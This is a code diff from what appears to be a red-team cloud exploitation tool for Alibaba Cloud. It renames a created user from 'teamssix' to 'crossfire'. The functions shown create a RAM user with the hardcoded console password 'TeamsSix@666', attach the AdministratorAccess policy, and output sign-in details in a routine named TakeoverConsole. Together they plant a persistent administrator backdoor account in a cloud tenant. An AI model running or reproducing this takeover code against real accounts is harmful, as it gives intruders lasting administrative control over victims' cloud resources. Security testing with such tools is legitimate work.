@@ -12,23 +12,23 @@ import (
 func CreateUser() {
 	request := ram.CreateCreateUserRequest()
 	request.Scheme = "https"
-	request.UserName = "teamssix"
+	request.UserName = "crossfire"
 	_, err := RAMClient().CreateUser(request)
 	util.HandleErrNoExit(err)
 	if err == nil {
-		log.Debugln("创建 teamssix 用户成功 (Create teamssix user successfully)")
+		log.Debugln("创建 crossfire 用户成功 (Create crossfire user successfully)")
 	}
 }
 
 func CreateLoginProfile() {
 	request := ram.CreateCreateLoginProfileRequest()
 	request.Scheme = "https"
-	request.UserName = "teamssix"
+	request.UserName = "crossfire"
 	request.Password = "TeamsSix@666"
 	_, err := RAMClient().CreateLoginProfile(request)
 	util.HandleErrNoExit(err)
 	if err == nil {
-		log.Debugln("成功为 teamssix 用户创建控制台登录密码 (Successfully created console login password for teamssix user)")
+		log.Debugln("成功为 crossfire 用户创建控制台登录密码 (Successfully created console login password for crossfire user)")
 	}
 }
 
@@ -37,11 +37,11 @@ func AttachPolicyToUser() {
 	request.Scheme = "https"
 	request.PolicyType = "System"
 	request.PolicyName = "AdministratorAccess"
-	request.UserName = "teamssix"
+	request.UserName = "crossfire"
 	_, err := RAMClient().AttachPolicyToUser(request)
 	util.HandleErrNoExit(err)
 	if err == nil {
-		log.Debugln("成功为 teamssix 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the teamssix user)")
+		log.Debugln("成功为 crossfire 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the crossfire user)")
 	}
 }
 
@@ -59,7 +59,7 @@ func TakeoverConsole() {
 	CreateLoginProfile()
 	AttachPolicyToUser()
 	accountAlias := GetAccountAlias()
-	username := fmt.Sprintf("teamssix@%s", accountAlias)
+	username := fmt.Sprintf("crossfire@%s", accountAlias)
 	data := [][]string{
 		{username, "TeamsSix@666", "https://signin.aliyun.com"},
 	}
